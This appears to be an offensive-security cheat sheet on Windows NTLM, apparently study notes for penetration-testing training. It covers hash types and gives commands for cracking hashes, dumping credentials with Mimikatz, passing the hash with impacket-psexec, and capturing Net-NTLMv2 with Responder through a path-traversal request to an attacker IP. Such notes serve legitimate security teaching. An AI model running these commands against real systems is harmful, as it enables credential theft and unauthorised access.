---
icon: windows
---

# NTLM

## Introduction

Windows stores hashed user passwords in the Security Account Manager (SAM) database file or at NTDS.DIT data base which is located at the Domain Controllers.\
Important thing to note that the hashes stored are not salted.

There are multiple versions of hashes that used to store passwords in windows.

### LM

LM hash is the most traditional way to store passwords in windows but it's considered weak and not enough. also, It’s disabled by default since windows vista/windows server 2008.

Cracking **LM** hash:

```bash
john --format=lm hash.txt
hashcat -m 3000 -a 3 hash.txt
```

### **NTHash**

On modern systems, the hashes are stored as NTHash hashes a.k.a NTLM.

Cracking NTHashes

```bash
john --format=nt hash.txt
hashcat -m 1000 -a 3 hash.txt
```

### NTLMv1 <a href="#id-1070" id="id-1070"></a>

The NTLMv1 A.K.A. Net-NTLMv1 protocol uses the **NTHash** in a challenge/response between a server and a client.

Cracking NTLMv1 hash:

```bash
john --format=netntlm hash.txt
hashcat -m 5500 -a 3 hash.txt
```

### NTLMv2 <a href="#id-4fef" id="id-4fef"></a>

NTLMv2 A.K.A. Net-NTLMv2 is the new and improved version of the NTLMv1 protocol, which makes it a bit harder to crack.

Cracking NTLMv2 hash:

```bash
john --format=netntlm hash.txt
hashcat -m 5600 -a 3 hash.txt
```

## Mimikatz&#x20;

**mimikatz** is a well known tool to extract passwords and hashes in windows environments.

{% hint style="warning" %}
NOTE: We can only extract SAM database if we are running Mimikatz as `Administrator` (or higher) and have the `SeDebugPrivilege`
{% endhint %}

We can also elevate our privileges to the _SYSTEM_ account with tools like _PsExec_[11](https://portal.offsec.com/courses/pen-200-44065/learning/password-attacks-44959/working-with-password-hashes-45019/cracking-ntlm-44965#fn-local\_id\_3266-11) or the built-in Mimikatz _token elevation_ to obtain the required privileges.&#x20;

It is possible to obtain the required privileges using `PsExec` or token elevation using mimkatz.

### First steps

Running mimikatz and checking basic priviliges:

```batch
.\mimikatz.exe
privilege::debug
```

Elevating to the required privileges

```batch
token::elevate
```

### Commands

Extract plaintext passwords and password hashes from all available sources

{% code overflow="wrap" %}
```batch
sekurlsa::logonpasswords 
```
{% endcode %}

Extract the hashes from the SAM.

```batch
lsadump::sam 
```

## Pass The hash

{% hint style="warning" %}
NOTE: In order to perform pass-the-hash a local Administrator is required unless the target machine is misconfigured.
{% endhint %}

Passing the hash using `psexec` from impacket:

```bash
impacket-psexec -hashes :<NTHash> <username>@<target>
```

## Capture Net-NTLMv2

### Responder

Responder is a tool which able to start a server running various services.\
The Responder server handles the authentication process and prints all captured credentials and hashes.\
It supports HTTP, FTP, SMB as well poisoning capabilities for LLMNR, NBT\_NS and MDNS.

***

Basic scenario for capturing NTLMv2 using vulnerable web application:

running responder

```bash
sudo responder -I <interface>
```

assuming web is vulnerable to path traversal and using smb shares to display pages:

```bash
curl --path-as-is  'http://<targer>/\\<attacker_responder_ip>/a'
```

The vulnerable website will then authenticate with the responder server and the hashes will be captured.&#x20;

## References

{% embed url="https://github.com/SpiderLabs/Responder" %}
responder
{% endembed %}

{% embed url="https://github.com/ParrotSec/mimikatz" %}
mimkatz
{% endembed %}

{% embed url="https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4" %}
LM, NTLM, Net-NTLMv2, oh my!
{% endembed %}

\
